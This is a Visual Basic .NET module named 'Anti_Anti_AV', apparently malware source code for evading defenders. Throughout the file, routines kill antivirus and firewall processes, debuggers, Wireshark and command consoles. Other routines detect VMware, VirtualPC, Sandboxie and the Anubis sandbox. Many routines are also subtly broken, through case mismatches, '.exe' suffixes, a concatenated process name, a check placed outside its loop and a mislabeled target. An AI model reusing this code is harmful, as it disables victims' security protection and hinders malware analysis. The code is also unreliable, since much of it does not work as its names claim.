Imports Microsoft.Win32

Module Anti_Anti_AV

    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Dim regPID As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion", False)
    Dim pid As Object = regPID.GetValue("ProductId")
    Dim id As String = "76487-337-8429955-22614"

    Sub AntiNotepad()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "notepad.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiCMD()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "cmd.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub antiOutpost()
        Dim local As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To local.Length - 1
            Debug.WriteLine(local(i).ProcessName)
            If Strings.UCase(local(i).ProcessName) = Strings.UCase("outpost") Then 'Outpost
                local(i).Kill()
            End If
        Next
    End Sub

    Sub antiNode32()
        Dim local As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To local.Length - 1
            If Strings.UCase(local(i).ProcessName) = Strings.UCase("egui") Then
                local(i).Kill()
            End If
        Next
    End Sub

    Sub antiZoneAlarm()
        Dim local As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To local.Length - 1

        Next
        If Strings.UCase(local(i).ProcessName) = Strings.UCase("zlclient") Then
            local(i).Kill()
        End If
    End Sub

    Public Function AntiVmWare() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VMware SVGA II"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Public Function antiKAV() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("avp").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Sub AntiVirtualBox()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "a2servic.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Public Function AntiVirtualPC() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VM Additions S3 Trio32/64"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Private Sub getDevices()
        On Error GoTo error1
        Devices = GetObject("winmgmts:").ExecQuery(RegionA)
        For Each AdaptList In Devices
            Grafikadapter = AdaptList.Description
        Next
        Exit Sub
error1:
        End
    End Sub

    Public Function antiAnubis() As Boolean
        On Error GoTo error1
        Dim folder As String = Application.StartupPath
        Dim getFile As String = folder & "\sample.exe"
        If Application.ExecutablePath = getFile Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function antiAnubis2() As Boolean
        On Error GoTo error1
        If pid = id Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Sub AntiWireShark()
        Dim ProcessList As System.Diagnostics.Process()
        ProcessList = System.Diagnostics.Process.GetProcesses()
        Dim Proc As System.Diagnostics.Process
        Dim title As String
        For Each Proc In ProcessList
            title = Proc.MainWindowTitle
            If (String.Equals(title, "The Wireshark Network Analyzer")) Then
                Proc.Kill()
            End If
        Next
    End Sub

    Sub AntiWindowsDefender()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "MSASCui.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiASquared()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "a2servic.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiAvast()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ashWebSv.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiAVG()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "avgemc.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiBitDefender()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "bdagent"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiKaspersky()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "avp"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiMalwarebytes()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "mbam"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiMcAfee()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "mcagent" & "mcuimgr"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiNOD32()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "egui"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiNorton()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ccapp.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiOllyDBG()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ollydbg.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiDDT()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ddt.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiAQTime()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "aqt.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiAQtime2()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "aqtime.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiPROA()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "vbaplug.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiWinDbg()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "WinDbg.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiConEmu()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ConEmu.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiColorConsole()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ColorConsole.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiPowerCmd()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "PowerCmd.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
    Function antiSandboxie() As Boolean
        Try
            If GetModuleHandle("SbieDll.dll") Then
                Return True
            End If
        Catch ex As Exception
        End Try
    End Function

    Public Function antiSandboxie2() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

End Module
